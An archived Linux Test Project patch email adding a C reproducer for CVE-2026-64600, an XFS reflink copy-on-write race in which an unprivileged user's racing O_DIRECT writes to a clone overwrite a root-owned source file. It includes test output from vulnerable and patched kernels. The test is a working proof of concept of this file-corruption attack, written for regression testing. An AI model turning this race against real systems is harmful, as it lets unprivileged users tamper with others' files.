Return-Path: <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from picard.linux.it (picard.linux.it [213.254.12.146])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 331F9C531F9
	for <ltp@archiver.kernel.org>; Fri, 24 Jul 2026 08:28:43 +0000 (UTC)
Received: from picard.linux.it (localhost [IPv6:::1])
	by picard.linux.it (Postfix) with ESMTP id CDC443E1D63
	for <ltp@archiver.kernel.org>; Fri, 24 Jul 2026 10:28:41 +0200 (CEST)
Received: from in-4.smtp.seeweb.it (in-4.smtp.seeweb.it
 [IPv6:2001:4b78:1:20::4])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature ECDSA (secp384r1))
 (No client certificate requested)
 by picard.linux.it (Postfix) with ESMTPS id C54B33E1CFD
 for <ltp@lists.linux.it>; Fri, 24 Jul 2026 10:28:24 +0200 (CEST)
Received: from smtp-out1.suse.de (smtp-out1.suse.de
 [IPv6:2a07:de40:b251:101:10:150:64:1])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
 (No client certificate requested)
 by in-4.smtp.seeweb.it (Postfix) with ESMTPS id 10EAD10008F6
 for <ltp@lists.linux.it>; Fri, 24 Jul 2026 10:28:22 +0200 (CEST)
Received: from imap1.dmz-prg2.suse.org (unknown [10.150.64.97])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
 (No client certificate requested)
 by smtp-out1.suse.de (Postfix) with ESMTPS id 932BD7B64A;
 Fri, 24 Jul 2026 08:28:21 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
 t=1784881701; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding;
 bh=AjPhZyRcMPibLIcfaZXV/8ANecNR9r49slFqPN3vwI8=;
 b=roHvEtRpP/rVpyeULA6CqvYH1EKai0WLIF89MoAYNhxw5lmAbrnsIGNbkfRo6HwuRTOySB
 j+w0DfPpkcYy86rlb3FV+uvpTv/fJrV9teBTz5BgqZx0YvzmR9WXx7s4D5aMHhY/U06GP5
 vsbZGVNohZcn/heyj9BW5BBfhfVljDI=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
 s=susede2_ed25519; t=1784881701;
 h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding;
 bh=AjPhZyRcMPibLIcfaZXV/8ANecNR9r49slFqPN3vwI8=;
 b=UqFlrDnNtEhxYxJeoLcNdruANUs6NPl+bvINtH9NJuF9tGhY9HJ/Vdy26rttb+3ebxVszD
 U3+ad73+WcNFitAQ==
Authentication-Results: smtp-out1.suse.de;
	none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
 t=1784881701; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding;
 bh=AjPhZyRcMPibLIcfaZXV/8ANecNR9r49slFqPN3vwI8=;
 b=roHvEtRpP/rVpyeULA6CqvYH1EKai0WLIF89MoAYNhxw5lmAbrnsIGNbkfRo6HwuRTOySB
 j+w0DfPpkcYy86rlb3FV+uvpTv/fJrV9teBTz5BgqZx0YvzmR9WXx7s4D5aMHhY/U06GP5
 vsbZGVNohZcn/heyj9BW5BBfhfVljDI=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
 s=susede2_ed25519; t=1784881701;
 h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding;
 bh=AjPhZyRcMPibLIcfaZXV/8ANecNR9r49slFqPN3vwI8=;
 b=UqFlrDnNtEhxYxJeoLcNdruANUs6NPl+bvINtH9NJuF9tGhY9HJ/Vdy26rttb+3ebxVszD
 U3+ad73+WcNFitAQ==
Received: from imap1.dmz-prg2.suse.org (localhost [127.0.0.1])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
 (No client certificate requested)
 by imap1.dmz-prg2.suse.org (Postfix) with ESMTPS id 6A595779BA;
 Fri, 24 Jul 2026 08:28:21 +0000 (UTC)
Received: from dovecot-director2.suse.de ([2a07:de40:b281:106:10:150:64:167])
 by imap1.dmz-prg2.suse.org with ESMTPSA id oF/NFiUiY2ptegAAD6G6ig
 (envelope-from <andrea.cervesato@suse.de>); Fri, 24 Jul 2026 08:28:21 +0000
From: Andrea Cervesato <andrea.cervesato@suse.de>
Date: Fri, 24 Jul 2026 10:28:20 +0200
MIME-Version: 1.0
Message-Id: <20260724-cve-2026-64600-v1-1-8fa214385d2e@suse.com>
X-B4-Tracking: v=1; b=H4sIACMiY2oC/x3MQQqAIBBA0avErBswtQm6SrSIHGs2FgoSiHfPW
 r7F/wUSR+EEc1cgcpYkV2gY+g72cwsHo7hm0EqTmrTFPTN+QLKkFI7GO3KkJ0cGWnRH9vL8w2W
 t9QUsdC+0YAAAAA==
X-Change-ID: 20260724-cve-2026-64600-53fd6d627d63
To: Linux Test Project <ltp@lists.linux.it>
X-Mailer: b4 0.14.2
X-Developer-Signature: v=1; a=ed25519-sha256; t=1784881701; l=11628;
 i=andrea.cervesato@suse.com; s=20251210; h=from:subject:message-id;
 bh=5sEi0PNzbjQsk7Mq6L7laNZ2Y6ut5Awb1DvqzRpigGg=;
 b=9ZgFSoPssPQ8LQdPQ0iGlnsKeUukKwtEIzkhHRjfcuYPmAzbyVCDSe5SldQgjdLy0Tv5CWyhJ
 EcRnp6itnpPAge4ZGs2qAob7xJ82TyF0xo6boUydix92yUVSjx3TmUR
X-Developer-Key: i=andrea.cervesato@suse.com; a=ed25519;
 pk=zKY+6GCauOiuHNZ//d8PQ/UL4jFCTKbXrzXAOQSLevI=
X-Spamd-Result: default: False [-4.30 / 50.00]; BAYES_HAM(-3.00)[100.00%];
 NEURAL_HAM_LONG(-1.00)[-1.000];
 NEURAL_HAM_SHORT(-0.20)[-0.997]; MIME_GOOD(-0.10)[text/plain];
 FUZZY_RATELIMITED(0.00)[rspamd.com];
 RCVD_VIA_SMTP_AUTH(0.00)[]; ARC_NA(0.00)[];
 RCPT_COUNT_TWO(0.00)[2]; RCVD_TLS_ALL(0.00)[];
 DKIM_SIGNED(0.00)[suse.de:s=susede2_rsa,suse.de:s=susede2_ed25519];
 TO_DN_ALL(0.00)[]; FROM_HAS_DN(0.00)[]; MIME_TRACE(0.00)[0:+];
 FROM_EQ_ENVFROM(0.00)[]; TO_MATCH_ENVRCPT_ALL(0.00)[];
 RCVD_COUNT_TWO(0.00)[2];
 DBL_BLOCKED_OPENRESOLVER(0.00)[suse.com:email, suse.com:mid,
 imap1.dmz-prg2.suse.org:helo]
X-Virus-Scanned: clamav-milter 1.0.9 at in-4.smtp.seeweb.it
X-Virus-Status: Clean
Subject: [LTP] [PATCH] cve: reproducer for cve-2026-64600
X-BeenThere: ltp@lists.linux.it
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Linux Test Project <ltp.lists.linux.it>
List-Unsubscribe: <https://lists.linux.it/options/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=unsubscribe>
List-Archive: <http://lists.linux.it/pipermail/ltp/>
List-Post: <mailto:ltp@lists.linux.it>
List-Help: <mailto:ltp-request@lists.linux.it?subject=help>
List-Subscribe: <https://lists.linux.it/listinfo/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=subscribe>
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
Errors-To: ltp-bounces+ltp=archiver.kernel.org@lists.linux.it
Sender: "ltp" <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>

From: Andrea Cervesato <andrea.cervesato@suse.com>

Reproducer for CVE-2026-64600 ("RefluXFS"), a race condition in the XFS
reflink copy-on-write path for direct I/O writes. The bug was introduced
in kernel v4.11 by commit 3c68d44a2b49 ("xfs: allocate direct I/O COW
blocks in iomap_begin") and fixed by commit 2f4acd0fcd86 ("xfs: resample
the data fork mapping after cycling ILOCK").

Signed-off-by: Andrea Cervesato <andrea.cervesato@suse.com>
---
This reproducer has been created with the usage of Kimi K3 (as analyzer
and writer) and DeepSeek v4 Flash (Max) as reviewer, by taking the
RefluXFS technical paper as input:
https://cdn2.qualys.com/advisory/2026/07/22/RefluXFS.txt

On bugged kernel:

tst_test.c:2047: TINFO: LTP version: 20260529-131-gd12a6186b
tst_test.c:2050: TINFO: Tested kernel: 7.2.0-rc1-virtme #21 SMP PREEMPT_DYNAMIC Fri Jul 24 10:20:05 CEST 2026 x86_64
tst_kconfig.c:90: TINFO: Parsing kernel config '/lib/modules/7.2.0-rc1-virtme/build/.config'
tst_test.c:1875: TINFO: Overall timeout per run is 0h 00m 30s
cve-2026-64600.c:233: TFAIL: round 0: racing O_DIRECT write to the clone succeeded
[    1.252815] cve-2026-646
HINT: You _MAY_ be missing kernel fixes:

https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=2f4acd0fcd86

HINT: You _MAY_ be vulnerable to CVE(s):

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-64600

Summary:
passed   0
failed   1
broken   0
skipped  0
warnings 0

On patched kernel:

tst_test.c:2047: TINFO: LTP version: 20260529-131-gd12a6186b
tst_test.c:2050: TINFO: Tested kernel: 7.2.0-rc1-virtme #20 SMP PREEMPT_DYNAMIC Fri Jul 24 10:08:53 CEST 2026 x86_64
tst_kconfig.c:90: TINFO: Parsing kernel config '/lib/modules/7.2.0-rc1-virtme/build/.config'
tst_test.c:1875: TINFO: Overall timeout per run is 0h 00m 30s
[    1.665909] clocksource: Watchdog remote CPU 2 read timed out
[    8.099229] cve-2026-64600 (249) used greatest stack depth: 12216 bytes left
cve-2026-64600.c:242: TPASS: Source file survived racing O_DIRECT writers

Summary:
passed   1
failed   0
broken   0
skipped  0
warnings 0
---
 runtest/cve                              |   1 +
 testcases/kernel/fs/xfs/.gitignore       |   1 +
 testcases/kernel/fs/xfs/Makefile         |   7 +
 testcases/kernel/fs/xfs/cve-2026-64600.c | 283 +++++++++++++++++++++++++++++++
 4 files changed, 292 insertions(+)

diff --git a/runtest/cve b/runtest/cve
index 3bbcfd6a2f2fb204fc6ae4ba89b5a7554c2fcbc5..388d471b9d138004207cdef5414e3e78d1980a32 100644
--- a/runtest/cve
+++ b/runtest/cve
@@ -100,3 +100,4 @@ cve-2026-43494 io_uring04
 cve-2026-46300 xfrm02
 cve-2026-46300-skb-segment xfrm03
 cve-2026-46331 cve-2026-46331
+cve-2026-64600 cve-2026-64600
diff --git a/testcases/kernel/fs/xfs/.gitignore b/testcases/kernel/fs/xfs/.gitignore
new file mode 100644
index 0000000000000000000000000000000000000000..2b287f6c1195c1307ee8629a282fc4d3f759e5ed
--- /dev/null
+++ b/testcases/kernel/fs/xfs/.gitignore
@@ -0,0 +1 @@
+/cve-2026-64600
diff --git a/testcases/kernel/fs/xfs/Makefile b/testcases/kernel/fs/xfs/Makefile
new file mode 100644
index 0000000000000000000000000000000000000000..699efd876f25cb3cd5d86dfe001404f8ebfc4d51
--- /dev/null
+++ b/testcases/kernel/fs/xfs/Makefile
@@ -0,0 +1,7 @@
+top_srcdir			?= ../../../..
+
+include $(top_srcdir)/include/mk/testcases.mk
+
+LDLIBS			+= -lpthread
+
+include $(top_srcdir)/include/mk/generic_leaf_target.mk
diff --git a/testcases/kernel/fs/xfs/cve-2026-64600.c b/testcases/kernel/fs/xfs/cve-2026-64600.c
new file mode 100644
index 0000000000000000000000000000000000000000..0bca95f8f2ad31f0269de07625d28d733092ef49
--- /dev/null
+++ b/testcases/kernel/fs/xfs/cve-2026-64600.c
@@ -0,0 +1,283 @@
+// SPDX-License-Identifier: GPL-2.0-or-later
+/*
+ * Copyright (C) 2026 SUSE LLC Andrea Cervesato <andrea.cervesato@suse.com>
+ */
+
+/*\
+ * Reproducer for CVE-2026-64600 ("RefluXFS"), a race condition in the XFS
+ * reflink copy-on-write path for direct I/O writes. The bug was introduced
+ * in kernel v4.11 by commit 3c68d44a2b49 ("xfs: allocate direct I/O COW
+ * blocks in iomap_begin") and fixed by commit 2f4acd0fcd86 ("xfs: resample
+ * the data fork mapping after cycling ILOCK").
+ *
+ * When an :manpage:`ioctl(2)` FICLONE clone is written via ``O_DIRECT``,
+ * ``xfs_direct_write_iomap_begin()`` samples the clone's data-fork mapping
+ * under ILOCK and calls ``xfs_reflink_allocate_cow()``, which drops the
+ * ILOCK to allocate a transaction and then re-checks whether the *stale*
+ * physical block is still shared. If a second racing ``O_DIRECT`` writer
+ * completes a full copy-on-write cycle inside that lock-drop window, the
+ * old shared block's refcount drops to one, the first writer takes the
+ * "not shared, write in place" branch, and its write is submitted to the
+ * physical block that now belongs only to the reflink source file,
+ * corrupting it on disk.
+ *
+ * [Algorithm]
+ *
+ * - Create a root-owned target file on a reflink-enabled XFS and fill
+ *   its first block with a known pattern
+ * - Drop privileges to the unprivileged user ``nobody``
+ * - Positive control: a single ``O_DIRECT`` write to a fresh clone must
+ *   be copy-on-written and leave the target untouched
+ * - Each round: reflink-clone the target into a scratch clone file and
+ *   release a barrier of threads, each issuing one block-sized
+ *   ``O_DIRECT`` :manpage:`pwrite(2)` at offset 0 of the clone
+ * - Background threads loop on write/fdatasync/truncate cycles to stall
+ *   transaction allocation on log space and widen the lock-drop window
+ * - After each round, read back the target's first block bypassing the
+ *   page cache (``O_DIRECT``): any byte differing from the original
+ *   pattern means a racing write refluxed into the source file and the
+ *   kernel is vulnerable
+ *
+ * Root privilege is regained in cleanup() so the library can unmount
+ * the loop device.
+ */
+
+#define _GNU_SOURCE
+
+#include <pwd.h>
+
+#include "tst_test.h"
+#include "tst_safe_pthread.h"
+#include "tst_safe_prw.h"
+#include "lapi/ficlone.h"
+
+#define MNTPOINT	"mnt"
+#define WORKDIR		MNTPOINT "/work"
+#define TARGET		WORKDIR "/target"
+#define CLONE		WORKDIR "/clone"
+#define SCRATCH_FMT	WORKDIR "/scratch%d"
+
+#define BLKSIZE		4096
+#define NWRITERS	32
+#define NPRESSURE	16
+#define MAX_ROUNDS	5000
+
+static char *tbuf, *wbuf, *rbuf;
+
+static int target_fd = -1;
+static int target_dio_fd = -1;
+static int clone_fd = -1;
+
+static pthread_t writers[NWRITERS];
+static pthread_t pressure_threads[NPRESSURE];
+static pthread_barrier_t barrier;
+static int barrier_initialized;
+static volatile sig_atomic_t stop_pressure;
+static int pressure_running;
+static int privileges_dropped;
+
+static void *writer_fn(void *arg)
+{
+	int fd;
+
+	(void)arg;
+
+	fd = SAFE_OPEN(CLONE, O_RDWR | O_DIRECT);
+
+	SAFE_PTHREAD_BARRIER_WAIT(&barrier);
+
+	SAFE_PWRITE(1, fd, wbuf, BLKSIZE, 0);
+	SAFE_CLOSE(fd);
+
+	return NULL;
+}
+
+static void *pressure_fn(void *arg)
+{
+	char path[PATH_MAX];
+	int fd;
+
+	snprintf(path, sizeof(path), SCRATCH_FMT, (int)(long)arg);
+
+	fd = SAFE_OPEN(path, O_RDWR | O_CREAT | O_TRUNC, 0600);
+
+	while (!stop_pressure) {
+		SAFE_PWRITE(1, fd, wbuf, BLKSIZE, 0);
+		SAFE_FTRUNCATE(fd, 0);
+		SAFE_FSYNC(fd);
+	}
+
+	SAFE_CLOSE(fd);
+
+	return NULL;
+}
+
+static void stop_pressure_threads(void)
+{
+	if (!pressure_running)
+		return;
+
+	stop_pressure = 1;
+
+	for (int i = 0; i < NPRESSURE; i++)
+		SAFE_PTHREAD_JOIN(pressure_threads[i], NULL);
+
+	pressure_running = 0;
+}
+
+static void drop_privileges(void)
+{
+	struct passwd *pw;
+
+	pw = SAFE_GETPWNAM("nobody");
+	SAFE_SETEGID(pw->pw_gid);
+	SAFE_SETEUID(pw->pw_uid);
+
+	privileges_dropped = 1;
+}
+
+static void restore_privileges(void)
+{
+	if (!privileges_dropped)
+		return;
+
+	SAFE_SETEUID(0);
+	SAFE_SETEGID(0);
+
+	privileges_dropped = 0;
+}
+
+static void setup(void)
+{
+	int probe_fd, probe_dio_fd;
+
+	tbuf = SAFE_MEMALIGN(BLKSIZE, BLKSIZE);
+	wbuf = SAFE_MEMALIGN(BLKSIZE, BLKSIZE);
+	rbuf = SAFE_MEMALIGN(BLKSIZE, BLKSIZE);
+
+	memset(tbuf, 'A', BLKSIZE);
+	memset(wbuf, 'X', BLKSIZE);
+	memset(rbuf, 0, BLKSIZE);
+
+	SAFE_MKDIR(WORKDIR, 0700);
+	SAFE_CHMOD(WORKDIR, 0777);
+
+	target_fd = SAFE_OPEN(TARGET, O_RDWR | O_CREAT | O_TRUNC, 0644);
+	SAFE_WRITE(1, target_fd, tbuf, BLKSIZE);
+	SAFE_FSYNC(target_fd);
+	SAFE_CLOSE(target_fd);
+
+	drop_privileges();
+
+	target_fd = SAFE_OPEN(TARGET, O_RDONLY);
+	probe_fd = SAFE_OPEN(CLONE, O_RDWR | O_CREAT | O_TRUNC, 0600);
+
+	TEST(ioctl(probe_fd, FICLONE, target_fd));
+	if (TST_RET == -1) {
+		if (TST_ERR == EOPNOTSUPP || TST_ERR == EINVAL || TST_ERR == ENOSYS) {
+			tst_brk(TCONF, "reflink clones not supported: %s",
+				tst_strerrno(TST_ERR));
+		}
+
+		tst_brk(TBROK | TTERRNO, "ioctl(FICLONE) failed");
+	}
+
+	probe_dio_fd = SAFE_OPEN(CLONE, O_RDWR | O_DIRECT);
+	SAFE_PWRITE(1, probe_dio_fd, wbuf, BLKSIZE, 0);
+	SAFE_CLOSE(probe_dio_fd);
+	SAFE_CLOSE(probe_fd);
+
+	/* The racy write bypasses the target's page cache, so must the read */
+	target_dio_fd = SAFE_OPEN(TARGET, O_RDONLY | O_DIRECT);
+
+	SAFE_PREAD(1, target_dio_fd, rbuf, BLKSIZE, 0);
+	if (memcmp(rbuf, tbuf, BLKSIZE))
+		tst_brk(TBROK, "Source file modified by a single O_DIRECT write to the clone");
+
+	SAFE_PTHREAD_BARRIER_INIT(&barrier, NULL, NWRITERS + 1);
+	barrier_initialized = 1;
+}
+
+static void run(void)
+{
+	int i, round, corrupted = 0;
+
+	stop_pressure = 0;
+
+	for (i = 0; i < NPRESSURE; i++)
+		SAFE_PTHREAD_CREATE(&pressure_threads[i], NULL, pressure_fn,
+				    (void *)(long)i);
+	pressure_running = 1;
+
+	for (round = 0; round < MAX_ROUNDS; round++) {
+		clone_fd = SAFE_OPEN(CLONE, O_RDWR | O_CREAT | O_TRUNC, 0600);
+
+		/*
+		 * target_fd is O_RDONLY opened as "nobody".  FICLONE
+		 * checks inode permission against our effective UID.
+		 */
+		SAFE_IOCTL(clone_fd, FICLONE, target_fd);
+		SAFE_CLOSE(clone_fd);
+
+		for (i = 0; i < NWRITERS; i++)
+			SAFE_PTHREAD_CREATE(&writers[i], NULL, writer_fn, NULL);
+
+		SAFE_PTHREAD_BARRIER_WAIT(&barrier);
+
+		for (i = 0; i < NWRITERS; i++)
+			SAFE_PTHREAD_JOIN(writers[i], NULL);
+
+		SAFE_PREAD(1, target_dio_fd, rbuf, BLKSIZE, 0);
+
+		if (memcmp(rbuf, tbuf, BLKSIZE)) {
+			tst_res(TFAIL, "round %d: racing O_DIRECT write to the clone succeeded", round);
+			corrupted = 1;
+			break;
+		}
+	}
+
+	stop_pressure_threads();
+
+	if (!corrupted)
+		tst_res(TPASS, "Source file survived racing O_DIRECT writers");
+}
+
+static void cleanup(void)
+{
+	stop_pressure_threads();
+	restore_privileges();
+
+	if (barrier_initialized)
+		SAFE_PTHREAD_BARRIER_DESTROY(&barrier);
+
+	if (target_dio_fd != -1)
+		SAFE_CLOSE(target_dio_fd);
+
+	if (target_fd != -1)
+		SAFE_CLOSE(target_fd);
+
+	if (clone_fd != -1)
+		SAFE_CLOSE(clone_fd);
+
+	free(tbuf);
+	free(wbuf);
+	free(rbuf);
+}
+
+static struct tst_test test = {
+	.test_all = run,
+	.setup = setup,
+	.cleanup = cleanup,
+	.needs_root = 1,
+	.mount_device = 1,
+	.mntpoint = MNTPOINT,
+	.filesystems = (struct tst_fs []) {
+		{.type = "xfs"},
+		{}
+	},
+	.tags = (const struct tst_tag[]) {
+		{"linux-git", "2f4acd0fcd86"},
+		{"CVE", "2026-64600"},
+		{}
+	},
+};

---
base-commit: d12a6186b60491cfa72e10944bd312e75b684c5e
change-id: 20260724-cve-2026-64600-53fd6d627d63

Best regards,
-- 
Andrea Cervesato <andrea.cervesato@suse.com>


-- 
Mailing list info: https://lists.linux.it/listinfo/ltp
